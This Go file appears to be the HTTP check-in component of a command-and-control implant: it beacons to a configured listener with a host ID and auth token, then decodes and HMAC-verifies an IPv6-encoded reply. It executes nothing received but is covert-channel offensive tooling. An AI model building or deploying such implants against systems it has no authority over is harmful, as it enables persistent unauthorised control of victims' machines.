//go:build http

package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"

	"github.com/matt-culbert/dns-daemon/implant/shared"
)

// Struct to hold the response format from the server
type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

var CompUUID string

func main() {
	// Load configuration from embedded data
	conf, err := shared.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	baseUrl := "http://" + conf.Listener + "/auth/" + CompUUID

	token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)

	reqURL, _ := url.Parse(baseUrl)

	// Add params to the query (The auth token and time)
	params := url.Values{}
	params.Add("token", token)
	params.Add("timestamp", timestamp)
	reqURL.RawQuery = params.Encode()
	fmt.Println(reqURL.String())

	// Make the GET request
	resp, err := http.Get(reqURL.String())
	if err != nil {
		log.Fatalf("Error making GET request: %v", err)
	}

	defer resp.Body.Close()

	// Check the response status
	if resp.StatusCode != http.StatusOK {
		log.Fatalf("Non-OK HTTP status: %s", resp.Status)
	}

	// Read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalf("Error reading response body: %v", err)
	}

	// Parse the JSON response
	var data ResponseData
	err = json.Unmarshal(body, &data)
	if err != nil {
		log.Fatalf("Failed to parse JSON response: %v", err)
	}

	// Print the values (for testing)
	fmt.Println("Message:", data.Message)
	fmt.Println("Key:", data.Key)

	decoded, _ := shared.DecodeIPv6ToString(string(data.Message))
	fmt.Println("Decoded string:", decoded)

	// Verify the message with the received HMAC
	if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
		fmt.Println("HMAC is valid!")
	} else {
		fmt.Println("HMAC is invalid or message was tampered with.")
	}

}
